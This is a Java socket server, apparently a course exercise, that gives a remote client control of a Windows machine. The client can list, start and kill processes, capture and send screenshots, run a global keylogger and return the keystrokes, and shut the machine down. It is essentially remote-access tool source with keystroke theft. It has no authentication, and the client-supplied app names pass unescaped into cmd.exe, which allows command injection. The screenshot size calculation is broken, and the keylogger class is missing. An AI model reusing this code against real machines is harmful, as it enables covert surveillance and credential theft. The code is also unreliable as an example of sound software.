// A Java program for a Server

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.net.*;
import java.io.*;
import java.util.Scanner;
import java.lang.Object;
import java.awt.Image;

import java.io.File;
import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;

import java.io.OutputStream;
import java.io.PrintWriter;

import static java.lang.System.*;

public class Server {
    //initialize socket and input stream
    private Socket socket = null;
    private ServerSocket server = null;
    private DataInputStream in = null;
    static DataOutputStream out = null;

    Server _this = this ;
    // constructor with port
    public Server(int port) throws IOException {
        // starts server and waits for a connection
        try
        {
            server = new ServerSocket(port);
            System.out.println("Server started");

            System.out.println("Waiting for a client ...");

            socket = server.accept();
            System.out.println("Client accepted");

            // takes input from the client socket
            in = new DataInputStream(
                    new BufferedInputStream(socket.getInputStream()));
            // sends output to the socket
            out = new DataOutputStream(socket.getOutputStream());


            while (true){
                String clientOption = "";
                // Receive option from client
                clientOption = in.readUTF();
                //System.out.println(clientOption);

                // Check client Option
                if (clientOption.equals("1")){
                    quest1(in, out);
                }
                else if (clientOption.equals("2")){
                    quest2(in, out);
                }
                else if (clientOption.equals("3")){
                    quest3(socket, in, out);
                }
                else if (clientOption.equals("4")){
                    quest4(in, out);
                }
                else if (clientOption.equals("5")){
                    // Shutdown
                    quest5(in, out);
                }
                else if (clientOption.equals("6")){
                    break;
                }
                else{
                    System.out.println("Error");
                    exit(0);
                }
            }


            System.out.println("Closing connection");

            // close connection
            socket.close();
            in.close();
        }
        catch(IOException i)
        {
            System.out.println(i);
        }
    }

    // Question 1------------------------------------------------------------------------------------------------
    static void quest1(DataInputStream in, DataOutputStream out) throws IOException {
        // Print all process
        try {
            String line;
            Process p = Runtime.getRuntime().exec
                    (getenv("windir") + "\\system32\\" + "tasklist.exe");
            BufferedReader input =
                    new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((line = input.readLine()) != null) {
                out.writeUTF(line);
                //System.out.println(line);
            }
            out.writeUTF("#");
            input.close();
        } catch (Exception err) {
            err.printStackTrace();
        }

        // Receive option (stat/stop)
        String option = in.readUTF();
        // Check
        if (option.equals("START")) { // Start
            // Receive app name
            String appName = in.readUTF();
            String commandLineStart = String.format("start %s", appName);

            ProcessBuilder builder = new ProcessBuilder(
                    "cmd.exe", "/c", commandLineStart);
            builder.redirectErrorStream(true);
            Process p = builder.start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        } else if (option.equals("STOP")) { // Delete
            // Receive pid
            String pid = in.readUTF();

            String commandLineStop = String.format("taskkill /F /PID %s", pid);

            ProcessBuilder builder = new ProcessBuilder(
                    "cmd.exe", "/c", commandLineStop);
            builder.redirectErrorStream(true);
            Process p = builder.start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;

            while (true) {
                line = r.readLine();
                if (line == null) {
                    break;
                }
                System.out.println(line);
            }
        }
    }

    // Question 2------------------------------------------------------------------------------------------------
    static void quest2(DataInputStream in, DataOutputStream out) throws IOException {
        // Print all process
        String commandLine = "powershell \"gps | where {$_.MainWindowTitle } | Select-Object Name, Id";

        ProcessBuilder builder = new ProcessBuilder(
                "cmd.exe", "/c", commandLine);
        builder.redirectErrorStream(true);
        Process p = builder.start();
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line = "";

        while (true) {
            line = r.readLine();
            if (line == null) {
                break;
            }

            out.writeUTF(line);
            System.out.println(line);
        }
        out.writeUTF("#");

        // Receive option (stat/stop)
        String option = in.readUTF();
        // Check
        if (option.equals("START")) { // Start
            // Receive app name
            String appName = in.readUTF();
            String commandLineStart = String.format("start %s", appName);

            builder = new ProcessBuilder(
                    "cmd.exe", "/c", commandLineStart);
            builder.redirectErrorStream(true);
            p = builder.start();
            r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        } else if (option.equals("STOP")) { // Delete
            // Receive pid
            String pid = in.readUTF();

            String commandLineStop = String.format("taskkill /F /PID %s", pid);

            builder = new ProcessBuilder(
                    "cmd.exe", "/c", commandLineStop);
            builder.redirectErrorStream(true);
            p = builder.start();
            r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            line = "";

            while (true) {
                line = r.readLine();
                if (line == null) {
                    break;
                }
                System.out.println(line);
            }
        }
    }

    // Question 3------------------------------------------------------------------------------------------------
    static void quest3(Socket socket, DataInputStream in, DataOutputStream out) throws IOException {
        // Take screenshot
        String imageName = "ServerScreenshot";
        //String commandLine = String.format("cd tool\\ && nircmd.exe savescreenshot %s.png", imageName);
        String commandLine = String.format("nircmd.exe savescreenshot %s.png", imageName);
        ProcessBuilder builder = new ProcessBuilder(
                "cmd.exe", "/c", commandLine);
        builder.redirectErrorStream(true);
        Process p = builder.start();

        // Send image
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            System.out.println(e);
        }


        FileInputStream fis = new FileInputStream("ServerScreenshot.png");
        DataOutputStream os = new DataOutputStream(socket.getOutputStream());

        // Send size image
        int i, imageSize = 0;
        while ((i = fis.read()) > -1){
            imageSize += i;
        }
        out.writeUTF(Integer.toString(imageSize));
        System.out.println(imageSize);

        // Send image
        fis = new FileInputStream("ServerScreenshot.png");
        while ((i = fis.read()) > -1){
            os.write(i);
        }

        System.out.println("Done");
    }

    // Question 4------------------------------------------------------------------------------------------------
    void quest4(DataInputStream in, DataOutputStream out) throws IOException {
        keyLogger kl = new keyLogger(this);
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            throw new RuntimeException(e);
        }
        GlobalScreen.addNativeKeyListener(kl);
        String mess = in.readUTF();
        String key = "";
        if (mess.equals("STOP")){
             key = kl.key;
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException e) {
                throw new RuntimeException(e);
            }
            System.out.println(key);
        }
        // Send key to client
        out.writeUTF(key);
    }

    void sendMess(String mess) throws IOException {
        this.out.writeUTF(mess);
    }

    // Question 5------------------------------------------------------------------------------------------------
    static void quest5(DataInputStream in, DataOutputStream out) throws IOException {
        String commandLine = "shutdown /s";

        ProcessBuilder builder = new ProcessBuilder(
                "cmd.exe", "/c", commandLine);
        builder.redirectErrorStream(true);
        Process p = builder.start();
    }

    public static void main(String[] args) {
        try {
            Server server = new Server(5000);

        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}



